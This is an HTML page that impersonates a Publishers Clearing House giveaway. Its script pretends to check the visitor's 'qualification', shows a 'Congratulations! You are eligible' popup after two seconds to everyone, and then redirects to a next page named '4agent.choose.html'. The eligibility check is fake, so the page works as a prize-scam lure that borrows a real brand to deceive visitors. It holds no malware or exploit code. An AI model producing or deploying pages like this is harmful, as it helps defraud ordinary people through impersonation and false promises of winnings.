<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PCH Giveaway - Check Qualification</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; font-family:'Arial', sans-serif; }

body {
    background: #ffffff;
    display: flex;
    flex-direction: column;
    align-items: center;
    min-height: 100vh;
}

/* Top banner */
.banner {
    width: 100%;
    background: #fbc02d;
    color: #ffffff;
    font-weight: bold;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 10px 0;
    box-shadow: 0 4px 10px rgba(0,0,0,0.1);
}

.banner-content {
    display: flex;
    align-items: center;
}

.banner-logo {
    width: 30px;
    height: 30px;
    border-radius: 50%;
    border: 2px solid #fff;
    background-image: url('pch_logo.jpg');
    background-size: cover;
    background-position: center;
    margin-right: 10px;
}

.banner-text {
    font-size: 1.2em;
}

/* Container */
.container {
    background: #fff9c4;
    padding: 40px 30px;
    border-radius: 20px;
    max-width: 450px;
    width: 100%;
    text-align: center;
    box-shadow: 0 8px 30px rgba(0,0,0,0.2);
    margin-top: 30px;
}

h1 {
    margin-bottom: 20px;
    color: #fbc02d;
}

/* Popup */
#popup {
    position: fixed;
    top:50%;
    left:50%;
    transform: translate(-50%, -50%);
    background: #fff9c4;
    border: 2px solid #fdd835;
    padding: 30px;
    border-radius: 20px;
    text-align: center;
    display: none;
    z-index: 10;
}

#popup h2 {
    margin-bottom: 20px;
    color: #fbc02d;
}

#popup button {
    padding: 12px 25px;
    border: none;
    border-radius: 10px;
    background: #fbc02d;
    color: #fff;
    font-size: 1em;
    cursor: pointer;
    animation: zoom 1s infinite alternate;
}

@keyframes zoom {
    0% { transform: scale(1); }
    100% { transform: scale(1.1); }
}
</style>
</head>
<body>

<div class="banner">
    <div class="banner-content">
        <div class="banner-logo"></div>
        <span class="banner-text">PUBLISHERS CLEARING HOUSE</span>
    </div>
</div>

<div class="container">
    <h1>Checking Your Qualification...</h1>
    <p>We are verifying if you are eligible for the PCH Giveaway prize.</p>
</div>

<!-- Eligibility popup -->
<div id="popup">
    <h2>Congratulations!</h2>
    <p>You are eligible for the PCH Giveaway prize.</p>
    <button id="proceedBtn">Proceed</button>
</div>

<script>
// Show eligibility popup after 5 seconds
window.addEventListener('load', function(){
    setTimeout(() => {
        document.getElementById('popup').style.display = 'block';
    }, 2000);
});

document.getElementById('proceedBtn').addEventListener('click', function(){
    this.disabled = true;
    this.innerText = "Loading...";
    setTimeout(()=>{window.location.href = "4agent.choose.html";}, 3000);
});
</script>

</body>
</html>
